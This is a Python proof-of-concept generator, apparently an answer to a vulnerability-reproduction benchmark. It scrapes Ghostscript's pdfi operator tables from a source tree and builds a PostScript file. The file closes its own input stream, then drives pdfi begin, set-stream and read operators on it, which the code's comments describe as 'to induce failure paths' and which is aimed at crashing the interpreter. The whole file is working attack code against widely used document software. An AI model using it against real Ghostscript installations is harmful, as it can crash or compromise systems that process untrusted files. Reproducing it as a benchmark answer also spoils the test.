import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    _OP_ENTRY_RE = re.compile(r'\{\s*"([^"]+)"\s*,\s*([A-Za-z_][A-Za-z0-9_]*)\s*\}')
    _FUNC_DEF_RE_TEMPLATE = r'(?s)\b(?:static\s+)?int\s+{fname}\s*\([^;{{}}]*\)\s*\{{'

    _DELIMS = set("()<>[]{}/% \t\r\n")

    def _is_ps_name(self, s: str) -> bool:
        if not s:
            return False
        for ch in s:
            if ch in self._DELIMS:
                return False
        return True

    def _strip_count_prefix(self, opname_raw: str) -> Tuple[Optional[int], str]:
        m = re.match(r'^(\d+)(.*)$', opname_raw)
        if not m:
            return None, opname_raw
        try:
            return int(m.group(1)), m.group(2)
        except Exception:
            return None, opname_raw

    def _iter_source_texts(self, src_path: str) -> Iterable[Tuple[str, str]]:
        exts = ('.c', '.h', '.ps', '.txt', '.inc')
        keywords = ('pdfi', 'zpdf', 'runpdf', 'pdf_main')

        if os.path.isdir(src_path):
            paths_pri: List[str] = []
            paths_rest: List[str] = []
            for root, _, files in os.walk(src_path):
                for fn in files:
                    lf = fn.lower()
                    if not lf.endswith(exts):
                        continue
                    full = os.path.join(root, fn)
                    lfull = full.lower()
                    if any(k in lfull for k in keywords):
                        paths_pri.append(full)
                    else:
                        paths_rest.append(full)
            for p in paths_pri + paths_rest:
                try:
                    with open(p, 'rb') as f:
                        b = f.read()
                    yield p, b.decode('latin-1', errors='ignore')
                except Exception:
                    continue
            return

        try:
            tf = tarfile.open(src_path, mode='r:*')
        except Exception:
            return

        members = [m for m in tf.getmembers() if m.isfile() and m.size > 0]
        pri = []
        rest = []
        for m in members:
            name = m.name
            lname = name.lower()
            if not lname.endswith(exts):
                continue
            if any(k in lname for k in keywords):
                pri.append(m)
            else:
                rest.append(m)

        def read_member(m) -> Optional[str]:
            try:
                f = tf.extractfile(m)
                if f is None:
                    return None
                b = f.read()
                return b.decode('latin-1', errors='ignore')
            except Exception:
                return None

        for m in pri + rest:
            txt = read_member(m)
            if txt is None:
                continue
            yield m.name, txt

        try:
            tf.close()
        except Exception:
            pass

    def _extract_function_body_from_text(self, text: str, funcname: str) -> Optional[str]:
        pat = re.compile(self._FUNC_DEF_RE_TEMPLATE.format(fname=re.escape(funcname)))
        m = pat.search(text)
        if not m:
            return None
        i = m.end() - 1  # at '{'
        n = len(text)
        brace = 0
        in_s = False
        in_d = False
        in_line = False
        in_block = False
        esc = False

        start = i
        while i < n:
            ch = text[i]
            nxt = text[i + 1] if i + 1 < n else ''

            if in_line:
                if ch == '\n':
                    in_line = False
                i += 1
                continue
            if in_block:
                if ch == '*' and nxt == '/':
                    in_block = False
                    i += 2
                else:
                    i += 1
                continue

            if in_s:
                if esc:
                    esc = False
                elif ch == '\\':
                    esc = True
                elif ch == "'":
                    in_s = False
                i += 1
                continue

            if in_d:
                if esc:
                    esc = False
                elif ch == '\\':
                    esc = True
                elif ch == '"':
                    in_d = False
                i += 1
                continue

            if ch == '/' and nxt == '/':
                in_line = True
                i += 2
                continue
            if ch == '/' and nxt == '*':
                in_block = True
                i += 2
                continue
            if ch == "'":
                in_s = True
                i += 1
                continue
            if ch == '"':
                in_d = True
                i += 1
                continue

            if ch == '{':
                brace += 1
            elif ch == '}':
                brace -= 1
                if brace == 0:
                    return text[start:i + 1]
            i += 1
        return None

    def _collect_pdfi_ops(self, src_path: str) -> Tuple[List[dict], Dict[str, str]]:
        ops: List[dict] = []
        texts: Dict[str, str] = {}
        for path, txt in self._iter_source_texts(src_path):
            if not txt:
                continue
            found_any = False
            for m in self._OP_ENTRY_RE.finditer(txt):
                opname_raw = m.group(1)
                func = m.group(2)
                cnt, opname = self._strip_count_prefix(opname_raw)
                opname = opname.strip()
                if not opname:
                    continue
                if not self._is_ps_name(opname):
                    continue
                lo = opname.lower()
                lf = func.lower()
                if ('pdfi' not in lo) and ('pdfi' not in lf) and ('runpdf' not in lo) and ('zpdf' not in path.lower()):
                    continue
                ops.append(
                    {
                        "opname_raw": opname_raw,
                        "opname": opname,
                        "count": cnt,
                        "func": func,
                        "path": path,
                        "body": None,
                    }
                )
                found_any = True
            if found_any or ('pdfi' in path.lower()) or ('zpdfi' in path.lower()):
                texts[path] = txt
        return ops, texts

    def _score_begin(self, op: dict, body: str) -> float:
        n = op["opname"].lower()
        s = 0.0
        if op.get("count") == 0:
            s += 5.0
        if "begin" in n:
            s += 4.0
        if "init" in n or "new" in n or "create" in n:
            s += 2.0
        if "pdfi" in n:
            s += 2.0
        if body:
            lb = body.lower()
            if "pdfi" in lb and ("alloc" in lb or "gs_alloc" in lb or "gs_memory" in lb):
                s += 1.5
            if "ctx" in lb and ("return" in lb or "push" in lb):
                s += 0.5
        return s

    def _score_setter(self, op: dict, body: str) -> float:
        n = op["opname"].lower()
        s = 0.0
        if "set" in n:
            s += 3.0
        if "input" in n:
            s += 2.0
        if "stream" in n:
            s += 2.0
        if "file" in n:
            s += 1.0
        cnt = op.get("count")
        if cnt in (1, 2, 3):
            s += 2.0
        if body:
            lb = body.lower()
            if "input" in lb and "stream" in lb:
                s += 3.0
            if "set_input" in lb or "setinput" in lb:
                s += 2.0
            if "pdfi" in lb and ("stream" in lb or "file" in lb):
                s += 1.0
        return s

    def _score_consumer(self, op: dict, body: str) -> float:
        n = op["opname"].lower()
        s = 0.0
        cnt = op.get("count")
        if cnt == 1:
            s += 3.0
        if cnt == 2:
            s += 2.0
        for kw in ("read", "seek", "token", "byte", "getc", "peek", "xref", "parse", "obj", "page"):
            if kw in n:
                s += 1.5
                break
        if "pdfi" in n:
            s += 1.0
        if body:
            lb = body.lower()
            if "stream" in lb and ("read" in lb or "seek" in lb or "getc" in lb or "buffer" in lb):
                s += 2.0
            if "input" in lb and "stream" in lb:
                s += 2.5
            if "pdfi" in lb and "stream" in lb:
                s += 1.0
        return s

    def _get_body(self, op: dict, texts: Dict[str, str]) -> str:
        if op.get("body") is not None:
            return op["body"] or ""
        func = op["func"]
        body = None
        p = op["path"]
        t = texts.get(p)
        if t:
            body = self._extract_function_body_from_text(t, func)
        if body is None:
            for _, txt in texts.items():
                body = self._extract_function_body_from_text(txt, func)
                if body is not None:
                    break
        op["body"] = body or ""
        return op["body"]

    def _dedup_keep_order(self, items: List[str]) -> List[str]:
        seen = set()
        out = []
        for x in items:
            if x in seen:
                continue
            seen.add(x)
            out.append(x)
        return out

    def _ps_try_begin(self, opname: str, cnt: Optional[int]) -> str:
        # Attempt to call begin op; if success and something left on stack, store as /x.
        ops = ""
        if cnt is None:
            cnt = 0
        if cnt > 0:
            ops = " ".join(["0"] * min(cnt, 2)) + " "
        return f"x null eq{{{{{ops}{opname}}}stopped{{}}{{count 0 gt{{/x exch def}}if c}}ifelse}}if"

    def _ps_try_set(self, opname: str, cnt: Optional[int]) -> List[str]:
        # Return a list of setter attempt snippets; each clears stack on success.
        if cnt is None:
            cnt = 2
        out = []
        if cnt == 1:
            out.append(f"{{f {opname}}}stopped{{}}{{c}}ifelse")
            out.append(f"x null ne{{{{x {opname}}}stopped{{}}{{c}}ifelse}}if")
        elif cnt == 2:
            out.append(f"x null ne{{{{x f {opname}}}stopped{{}}{{c}}ifelse}}if")
            out.append(f"x null ne{{{{f x {opname}}}stopped{{}}{{c}}ifelse}}if")
            out.append(f"{{f f {opname}}}stopped{{}}{{c}}ifelse")
        else:
            # Try a couple of plausible combos
            out.append(f"x null ne{{{{x f 0 {opname}}}stopped{{}}{{c}}ifelse}}if")
            out.append(f"x null ne{{{{f x 0 {opname}}}stopped{{}}{{c}}ifelse}}if")
            out.append(f"{{f 0 0 {opname}}}stopped{{}}{{c}}ifelse")
        return out

    def _ps_try_consume(self, opname: str, cnt: Optional[int]) -> List[str]:
        # Return list of consumer attempts using x.
        if cnt is None:
            cnt = 1
        out = []
        if cnt == 1:
            out.append(f"x null ne{{{{x {opname}}}stopped{{}}{{c}}ifelse}}if")
        elif cnt == 2:
            out.append(f"x null ne{{{{x 0 {opname}}}stopped{{}}{{c}}ifelse}}if")
            out.append(f"x null ne{{{{x 1 {opname}}}stopped{{}}{{c}}ifelse}}if")
        else:
            out.append(f"x null ne{{{{x 0 0 {opname}}}stopped{{}}{{c}}ifelse}}if")
        return out

    def solve(self, src_path: str) -> bytes:
        ops, texts = self._collect_pdfi_ops(src_path)

        # Fallback operator names (common guesses)
        fallback_begin = [".pdfi_begin", ".pdfi_new", ".pdfi_init", ".pdfiStart", ".runpdfbegin", "runpdfbegin"]
        fallback_set = [".pdfi_set_input_stream", ".pdfi_set_input", ".pdfi_set_stream", ".setpdfiinputstream", ".setpdfistream"]
        fallback_cons = [".pdfi_read", ".pdfi_read_byte", ".pdfi_get_byte", ".pdfi_token", ".pdfi_next_token", ".pdfi_seek", ".pdfi_getc"]

        begin_cands: List[Tuple[float, dict]] = []
        set_cands: List[Tuple[float, dict]] = []
        con_cands: List[Tuple[float, dict]] = []

        for op in ops:
            body = self._get_body(op, texts)
            nlow = op["opname"].lower()
            if "pdfi" in nlow and ("begin" in nlow or "init" in nlow or "new" in nlow or "create" in nlow):
                begin_cands.append((self._score_begin(op, body), op))
            if ("set" in nlow and ("stream" in nlow or "input" in nlow)) or ("input" in nlow and "stream" in nlow):
                set_cands.append((self._score_setter(op, body), op))
            if "pdfi" in nlow and not (("set" in nlow and ("stream" in nlow or "input" in nlow)) or ("input" in nlow and "stream" in nlow)):
                sc = self._score_consumer(op, body)
                if sc > 0:
                    con_cands.append((sc, op))

        begin_cands.sort(key=lambda x: x[0], reverse=True)
        set_cands.sort(key=lambda x: x[0], reverse=True)
        con_cands.sort(key=lambda x: x[0], reverse=True)

        begin_ops: List[Tuple[str, Optional[int]]] = []
        set_ops: List[Tuple[str, Optional[int]]] = []
        con_ops: List[Tuple[str, Optional[int]]] = []

        for _, op in begin_cands[:5]:
            begin_ops.append((op["opname"], op.get("count")))
        for _, op in set_cands[:6]:
            set_ops.append((op["opname"], op.get("count")))
        for _, op in con_cands[:10]:
            con_ops.append((op["opname"], op.get("count")))

        # Add fallbacks (without known counts)
        begin_ops.extend([(n, None) for n in fallback_begin if self._is_ps_name(n)])
        set_ops.extend([(n, None) for n in fallback_set if self._is_ps_name(n)])
        con_ops.extend([(n, None) for n in fallback_cons if self._is_ps_name(n)])

        # Dedup by opname preserving order
        begin_ops_d = []
        seen = set()
        for n, c in begin_ops:
            if n in seen:
                continue
            seen.add(n)
            begin_ops_d.append((n, c))
        begin_ops = begin_ops_d

        set_ops_d = []
        seen = set()
        for n, c in set_ops:
            if n in seen:
                continue
            seen.add(n)
            set_ops_d.append((n, c))
        set_ops = set_ops_d

        con_ops_d = []
        seen = set()
        for n, c in con_ops:
            if n in seen:
                continue
            seen.add(n)
            con_ops_d.append((n, c))
        con_ops = con_ops_d

        parts: List[str] = []
        parts.append("%!PS")
        parts.append("/c{count{pop}repeat}bind def")
        parts.append("/p{c{(%rom%Resource/Init/pdf_main.ps)run}stopped pop/x null def/f currentfile dup closefile def c")

        for n, cnt in begin_ops[:8]:
            parts.append(self._ps_try_begin(n, cnt))

        # Try setting stream with closed currentfile to induce failure paths
        for n, cnt in set_ops[:8]:
            parts.extend(self._ps_try_set(n, cnt))

        # Consume after failed set
        for n, cnt in con_ops[:12]:
            parts.extend(self._ps_try_consume(n, cnt))

        # PostScript-level fallback sequence (if available)
        parts.append("{f runpdfbegin}stopped pop")
        parts.append("{1 pdfgetpage}stopped pop")
        parts.append("{pdfpagecount}stopped pop")
        parts.append("{runpdfend}stopped pop")

        parts.append("quit}bind def p")
        ps = " ".join(parts) + "\n"
        return ps.encode("latin-1", errors="ignore")